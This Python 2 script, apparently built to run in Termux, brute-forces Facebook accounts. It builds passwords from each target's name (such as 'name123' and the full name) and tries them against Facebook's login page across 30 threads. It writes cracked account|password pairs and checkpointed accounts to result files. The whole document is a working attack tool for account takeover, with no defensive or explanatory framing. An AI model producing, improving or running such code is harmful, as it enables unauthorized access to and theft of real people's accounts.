#!/usr/bin/python2
#-*-coding:utf-8-*-

try:
    import requests,bs4,sys,os,subprocess,datetime,shutil,sys,random,time,re,base64,json,glob,mm
    from concurrent.futures import ThreadPoolExecutor as NeMo
    from bs4 import BeautifulSoup as parser
except ImportError:
    exit

reload(sys)
sys.setdefaultencoding("utf-8")

cp = []
ok = []
id = []
user = []
loop = 0

logo = """\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m
            \033[1;92m •••••\033[1;97m\033[0m NEMO
\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m~\033[1;96m~\033[1;37m"""

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)

class __crack__:

    def __init__(self):
        self.id = []

    def __api__(self, user, __emo__):
        global ok,cp,loop
        sys.stdout.write('\r[WAIT] %s/%s -> %s %s'%(loop,len(self.id),len(cp),len(ok))),
        sys.stdout.flush()
        for pw in __emo__:
            pw = pw.lower()
            ngUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36'
            ses = requests.Session()
            ses.headers.update({"Host":"id-id.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ngUA,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://id-id.facebook.com")
            b = ses.post("https://id-id.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('/data/data/com.termux/files/home/fb/ok.txt','a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('/data/data/com.termux/files/home/fb/cp.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __brute__(self):
        raw_input('\nENTER to CRACK')
        try:
            path = r'/data/data/com.termux/files/home/fb'
            self.apk = random.choice(glob.glob(path + r'/*.txt'))
            self.id = open(self.apk).read().splitlines()
            print('\nFile: %s'%(self.apk))
        except:
            print('\nCOMPLETE')
            os.sys.exit()
        jalan;time.sleep(0.2)
        with NeMo(max_workers=30) as (__nemoXD__):
            for omen in self.id:
                try:
                    uid, name = omen.split('<=>')
                    x, y = name.split(' ')
                    if len(x) == 3 or len(x) == 4 or len(x) == 5 or len(x) == 6:
                        pwx = [x+" "+y, x+"123", x+"12345", x+"1234", y+"123"]
                    else:
                        pwx = [x+" "+y, x+"123", y+"123"]
                    __nemoXD__.submit(self.__api__, uid, pwx)
                except:
                    pass

        os.remove(self.apk);time.sleep(2)
        rename()

def rename():
    try:
        os.makedirs('/data/data/com.termux/files/home/fb/hasil')
        time.sleep(1)
    except OSError:
        pass
    try:
        open("/data/data/com.termux/files/home/fb/cp.txt","r")
        os.system("mv /data/data/com.termux/files/home/fb/cp.txt /data/data/com.termux/files/home/fb/cpcok.txt")
        onem = datetime.datetime.now().strftime("%d%m%y_%H%M%S")
        oldname = r"/data/data/com.termux/files/home/fb/cpcok.txt"
        newname = r"/data/data/com.termux/files/home/fb/hasil/cpcp" + onem + ".txt"
        shutil.move(oldname, newname)
        print("\nDONE")
    except (KeyError, IOError):
        print("\nZONK")
    try:
        open("/data/data/com.termux/files/home/fb/ok.txt","r")
        os.system("mv /data/data/com.termux/files/home/fb/ok.txt /data/data/com.termux/files/home/fb/okcok.txt")
        onem = datetime.datetime.now().strftime("%d%m%y_%H%M%S")
        oldname = r"/data/data/com.termux/files/home/fb/okcok.txt"
        newname = r"/data/data/com.termux/files/home/fb/hasil/okok" + onem + ".txt"
        shutil.move(oldname, newname)
        print("\nDONE")
    except (KeyError, IOError):
        pass
    raw_input('\nENTER to CONTINUE')
    sys.exit()

if __name__=='__main__':
    os.system('clear');print logo
    __crack__().__brute__()
